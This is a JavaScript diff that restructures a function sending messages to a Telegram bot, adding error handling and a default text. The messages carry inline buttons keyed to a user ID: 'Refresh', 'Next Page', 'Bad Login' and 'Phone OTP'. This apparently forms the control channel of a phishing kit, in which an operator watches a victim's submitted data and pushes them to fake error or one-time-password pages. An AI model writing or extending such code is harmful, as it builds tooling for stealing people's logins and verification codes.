@@ -266,32 +266,44 @@ async function buildMessage(data, options = {}) {
     }
 
   	  if (sendToTelegram) {
-  if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
-  if (!userId) throw new Error("userId is missing");
-
-  const sendMessage = sendMessageFor(botToken, chatId);
-
-  const buttons = [
-    [
-      { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
-      { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
-    ],
-    [
-      { text: "Bad Login", callback_data: `cmd:bad-login:${userId}` },
-      { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
-    ]
-  ];
-
-  await sendMessage(
-	  messageText,
-	  {
-	    parse_mode: "HTML",
-	    reply_markup: JSON.stringify({
-	      inline_keyboard: buttons
-	    })
-	  }
-	);
-}
+			  if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
+			  if (!userId) throw new Error("userId is missing");
+			
+			  const sendMessage = sendMessageFor(botToken, chatId);
+			
+			  const messageText = String(message || "Select a command:");
+			
+			  const buttons = [
+			    [
+			      { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
+			      { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
+			    ],
+			    [
+			      { text: "Bad Login", callback_data: `cmd:bad-login:${userId}` },
+			      { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
+			    ]
+			  ];
+			
+			  try {
+			    await sendMessage(messageText, {
+				  parse_mode: "HTML",
+				  reply_markup: JSON.stringify({
+				    inline_keyboard: buttons
+				  })
+				});
+			
+			    console.log("✅ Telegram message sent");
+			  } catch (err) {
+			    console.error("❌ Telegram error:", err);
+			  }
+			}
+		
+		    return message;
+		  } catch (err) {
+		    console.error("❌ buildMessage error:", err);
+		    return null;
+		  }
+		}
 		
 /* ================================
    AUTH / SESSION
